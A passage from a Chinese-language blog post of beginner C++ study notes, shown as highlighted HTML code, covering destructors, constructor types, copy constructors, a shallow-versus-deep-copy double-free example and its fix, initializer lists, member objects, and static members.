class="line">Person p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>语法这些后面的例子会存在，我想先写一个老师没讲的析构函数特点。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">~person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (h == <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (h == <span class="number">11</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;p2&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">person p1;</span><br><span class="line">p1.h = <span class="number">10</span>;</span><br><span class="line">person p2;</span><br><span class="line">p2.h = <span class="number">11</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test1();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的打印结果先是p2，后是p1，证明在这个例子中p2这个对象是先销毁的，我猜测可能和栈的结构有关吧，先入后出，后人先出，只是个人猜测。</p><p>2.构造函数的分类，老师讲的很详细，就直接腾过来了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1、构造函数分类</span></span><br><span class="line"><span class="comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span></span><br><span class="line"><span class="comment">// 按照类型分类分为 普通构造和拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//无参（默认）构造函数</span></span><br><span class="line">Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参构造函数</span></span><br><span class="line">Person(<span class="keyword">int</span> a) &#123;</span><br><span class="line">age = a;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//拷贝构造函数</span></span><br><span class="line">Person(<span class="keyword">const</span> Person&amp; p) &#123;</span><br><span class="line">age = p.age;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~Person() &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、构造函数的调用</span></span><br><span class="line"><span class="comment">//调用无参构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Person p; <span class="comment">//调用无参构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.1  括号法，常用</span></span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span></span><br><span class="line"><span class="comment">//Person p2();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.2 显式法</span></span><br><span class="line">Person p2 = Person(<span class="number">10</span>); </span><br><span class="line">Person p3 = Person(p2);</span><br><span class="line"><span class="comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.3 隐式转换法</span></span><br><span class="line">Person p4 = <span class="number">10</span>; <span class="comment">// Person p4 = Person(10); </span></span><br><span class="line">Person p5 = p4; <span class="comment">// Person p5 = Person(p4); </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span></span><br><span class="line"><span class="comment">//Person p5(p4);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"><span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.拷贝构造函数调用时机</p><ul><li>使用一个已经创建完毕的对象来初始化一个新对象</li><li>值传递的方式给函数参数传值</li><li>以值方式返回局部对象</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="keyword">const</span> Person &amp;p)</span><br><span class="line">&#123;</span><br><span class="line">age = p.age;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Person p;</span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(p)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test02</span><span class="params">(Person p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">Person <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Person p;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line">test01();</span><br><span class="line"><span class="comment">//值传递的方式给函数参数传值</span></span><br><span class="line">Person person;</span><br><span class="line">test02(person);</span><br><span class="line"><span class="comment">//以值方式返回局部对象</span></span><br><span class="line">Person q = test03();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4.深拷贝与浅拷贝，这个就比较有意思了</p><p>浅拷贝，就是编译器默认提供的拷贝，平时普通拷贝到没事，但是如果遇到在堆区申请的空间要拷贝是就会出问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">Person(<span class="keyword">int</span> age,<span class="keyword">int</span> hight)</span><br><span class="line">&#123;</span><br><span class="line">m_age = age;</span><br><span class="line">m_hight = <span class="keyword">new</span> <span class="keyword">int</span>(hight);</span><br><span class="line">&#125;</span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_hight != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_hight;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_age;</span><br><span class="line"><span class="keyword">int</span>* m_hight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="number">15</span>,<span class="number">170</span>)</span></span>;</span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(p)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">test01();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面程序会崩，为什么，因为我在定义对象p时，向堆区申请了一块空间，然后将对象p拷贝给对象p1时，编译器默认的拷贝函数也将申请的堆空间地址给了p1的m_hight属性，这两个地址是一样的，这些都没有问题。</p><p>问题就出在析构函数，我在析构函数中写了释放堆空间的代码，申请了就要释放，没有问题，而且根据我上面讲的案例，p1这个对象会先被销毁，销毁后申请的堆空间也没了，然后p对象在被销毁时，delete又释放那个空间，就会出问题。</p><p>为了解决这种问题，就有了深拷贝。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line">Person(<span class="keyword">int</span> age,<span class="keyword">int</span> hight)</span><br><span class="line">&#123;</span><br><span class="line">m_age = age;</span><br><span class="line">m_hight = <span class="keyword">new</span> <span class="keyword">int</span>(hight);</span><br><span class="line">&#125;</span><br><span class="line">Person(<span class="keyword">const</span> Person&amp; tmp)</span><br><span class="line">&#123;</span><br><span class="line">m_age = tmp.m_age;</span><br><span class="line">m_hight = <span class="keyword">new</span> <span class="keyword">int</span>(*tmp.m_hight);</span><br><span class="line">&#125;</span><br><span class="line">~Person()</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m_hight != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> m_hight;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_age;</span><br><span class="line"><span class="keyword">int</span>* m_hight;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="number">15</span>,<span class="number">170</span>)</span></span>;</span><br><span class="line"><span class="function">Person <span class="title">p1</span><span class="params">(p)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">test01();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5.初始化列表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//传统初始化参数</span></span><br><span class="line"><span class="comment">//Point(int x, int y)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//m_x = x;</span></span><br><span class="line"><span class="comment">//m_y = y;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列表方式</span></span><br><span class="line">Point(<span class="keyword">int</span> x, <span class="keyword">int</span> y) :m_x(x), m_y(y)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//里面还可以写些其他的能内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_x;</span><br><span class="line"><span class="keyword">int</span> m_y;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Point(<span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7.类对象作为类成员</p><p>这种我们之前在写圆和点关系的案例中实际上就用到过了。</p><p>先上例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//无参构造</span></span><br><span class="line">Point()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//有参构造</span></span><br><span class="line">Point(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span><br><span class="line">&#123;</span><br><span class="line">m_x = x;</span><br><span class="line">m_y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_x;</span><br><span class="line"><span class="keyword">int</span> m_y;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cirle</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//可以通过初始化列表来告诉编译器调用Point的那一个构造函数</span></span><br><span class="line">Cirle(<span class="keyword">int</span> r, <span class="keyword">int</span> x, <span class="keyword">int</span> y) :m_r(r), m_point(x, y)</span><br><span class="line">&#123;</span><br><span class="line">m_r = r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> m_r;</span><br><span class="line">Point m_point;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Cirle(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个可以讨论的问题，究竟是m_point这个对象先产生，还是Cirle对象先产生，答案是m_point对象先产生，Cirle对象后产生，而且析构销毁时，Cirle对象先被销毁，m_point对象后被销毁。</p><p>8.静态成员</p><p>静态成员就是在成员变量和成员函数前加上关键字static，称为静态成员</p><p>静态成员分为：</p><ul><li>静态成员变量<ul><li> 所有对象共享同一份数据</li><li> 在编译阶段分配内存</li><li> 类内声明，类外初始化</li></ul></li><li>静态成员函数<ul><li> 所有对象共享同一个函数</li><li> 静态成员函数只能访问静态成员变量</li></ul></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//静态对象</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> m_x;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> m_y;<span class="comment">//类外无法访问</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//初始化静态变量，在类外初始化</span></span><br><span class="line"><span class="keyword">int</span> Point::m_x = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> Point::m_y = <span class="number">10</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">Point a;</span><br><span class="line">Point b;</span><br><span class="line"><span class="comment">//用对象来访问静态变量</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a.m_x &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; b.m_x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//用类名来访问静态变量</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; Point::m_x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="comment">//修改某一个对象的静态成员，所有对象的静态成员都改变了。</span></span><br><span class="line">a.m_x = <span class="number">20</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a.m_x &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; b.m_x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员函数特点：</span></span><br><span class="line"><span class="comment">//1 程序共享一个函数</span></span><br><span class="line"><span class="comment">//2 静态成员函数只能访问静态成员变量</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">m_A = <span class="number">100</span>;</span><br><span class="line"><span class="comment">//m_B = 100; //错误，不可以访问非静态成员变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line"><span class="keyword">int</span> m_B; <span class="comment">// </span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"></span><br><span class="line"><span class="comment">//静态成员函数也是有访问权限的</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;func2调用&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//静态成员变量两种访问方式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1、通过对象</span></span><br><span class="line">Person p1;</span><br><span class="line">p1.func();</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、通过类名</span></span><br><span class="line">Person::func();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Person::func2(); //私有权限访问不到</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">test01();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="C-对象模型和this指针"><a 